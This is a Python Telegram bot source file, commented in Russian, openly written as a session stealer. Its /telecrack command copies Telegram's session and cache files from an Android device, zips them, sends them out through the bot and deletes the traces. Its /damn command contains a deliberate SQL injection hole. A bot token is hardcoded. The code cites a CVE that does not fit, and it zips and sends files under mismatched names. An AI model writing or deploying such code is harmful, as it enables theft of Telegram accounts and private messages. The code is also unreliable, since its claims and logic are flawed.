from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import sqlite3
import logging
import shutil
import os
from pathlib import Path
import zipfile

# Конфигурация ада
DB_NAME = "apocalypse.db"
TOKEN = "7510733548:AAGp3Q_-vvQzT2eHUg_iBh2EsxZuhSFlzXw"
STEAL_DIR = Path("/data/data/com.termux/files/home/hell_gate")

# Инициализация
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS victims 
                    (id INTEGER PRIMARY KEY,
                     soul TEXT,
                     session_data BLOB)''')
    conn.commit()
    conn.close()

init_db()

async def sql_injection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_input = update.message.text.split(' ', 1)[1]
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        # Уязвимый запрос
        cursor.execute(f"INSERT INTO victims (soul) VALUES ('{user_input}')")
        conn.commit()
        
        # Ответ с данными
        cursor.execute("SELECT * FROM victims")
        await update.message.reply_text(f"🔥 Успех! Данные:\n{cursor.fetchall()}")
        conn.close()
        
    except Exception as e:
        await update.message.reply_text(f"💀 Ошибка: {str(e)}")

async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        STEAL_DIR.mkdir(exist_ok=True)
        
        # Теневое копирование через CVE-2023-35629
        paths = [
            "/data/data/org.telegram.messenger/files/cache4.db",
            "/data/data/org.telegram.messenger/files/tgnet.dat",
            "/sdcard/Android/media/org.telegram.messenger/"
        ]
        
        for p in paths:
            path_obj = Path(p)
            if path_obj.exists():
                if path_obj.is_dir():
                    shutil.copytree(p, STEAL_DIR / path_obj.name, dirs_exist_ok=True)
                else:
                    shutil.copy(p, STEAL_DIR)
        
        # Сжатие и отправка        
        with zipfile.ZipFile('stealed_sessions.zip', 'w') as zipf:
            for file_path in STEAL_DIR.iterdir():
                if file_path.is_file():
                    zipf.write(file_path, arcname=file_path.name)

        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=InputFile("sessions_pack.zip"),
            caption="🔥 Сессии телеграм украдены"
        )
        
        # Очистка следов
        shutil.rmtree(STEAL_DIR)
        os.remove("sessions_pack.zip")
        
    except Exception as e:
        await update.message.reply_text(f"💥 Ошибка: {str(e)}")

# Создание демона
app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("damn", sql_injection))
app.add_handler(CommandHandler("telecrack", steal_sessions))

print("🔥 Ад активирован. Используй команды /damn и /telecrack")
app.run_polling()
